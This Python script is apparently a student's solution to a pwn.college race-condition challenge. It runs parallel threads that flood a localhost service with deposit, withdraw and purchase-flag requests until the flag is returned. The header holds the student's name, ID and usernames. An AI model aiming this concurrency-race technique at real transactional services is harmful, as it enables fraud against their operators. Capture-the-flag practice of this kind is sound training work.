# Name: Tanishq Javvaji
# Uid: 119070185
# pwn.college username: happy315
# Discord: @happy315 / Tanishq Javvaji
# !/usr/bin/env python3
import socket  
import threading  

def deposit():
    while True:  # Infinite loop to keep trying deposits
        # Step 1: Create a socket object for network communication
        deposit_socket = socket.socket()

        # Step 2: Define the server address and port
        server_address = 'localhost'
        server_port = 1337

        # Step 3: Establish connection to the server
        deposit_socket.connect((server_address, server_port))

        # Step 4: Prepare the deposit command to be sent to the server
        deposit_command = b"deposit\n"

        # Step 5: Send the deposit command to the server
        deposit_socket.sendall(deposit_command)

        # Step 6: Close the socket after sending the command
        deposit_socket.close()

def withdraw():
    while True:  # Infinite loop to keep trying withdrawals
        # Create a socket object for network communication
        withdraw_socket = socket.socket()

        # Define the server address and port
        server_address = 'localhost'
        server_port = 1337

        # Establish connection to the server
        withdraw_socket.connect((server_address, server_port))

        # Prepare the withdraw command to be sent to the server
        withdraw_command = b"withdraw\n"

        # Send the withdraw command to the server
        withdraw_socket.sendall(withdraw_command)

        # Close the socket after sending the command
        withdraw_socket.close()

def purchase_flag():
    while True:  # Infinite loop to keep trying to purchase the flag
        # Create a socket object for network communication
        flag_socket = socket.socket()

        # Define the server address and port
        server_address = 'localhost'
        server_port = 1337

        # Establish connection to the server
        flag_socket.connect((server_address, server_port))

        # Prepare the purchase flag command to be sent to the server
        purchase_command = b"purchase flag\n"

        # Send the purchase flag command to the server
        flag_socket.sendall(purchase_command)

        # Wait for a response from the server regarding the flag purchase
        flag_response = flag_socket.recv(1024)

        # Close the socket after sending the command and receiving the response
        flag_socket.close()

        # Check if the response contains the expected flag identifier
        if flag_response.decode().startswith('pwn.college'):
            # If the response starts with the expected identifier, print the flag
            print(flag_response.decode())

            # Break the loop if the flag is found, no need to continue
            break

# Create separate threads for deposit, withdraw, and purchase_flag functions
deposit_thread = threading.Thread(target=deposit)
withdraw_thread = threading.Thread(target=withdraw)
purchase_flag_thread = threading.Thread(target=purchase_flag)

# Start each thread, which initiates the respective functions in parallel
deposit_thread.start()
withdraw_thread.start()
purchase_flag_thread.start()
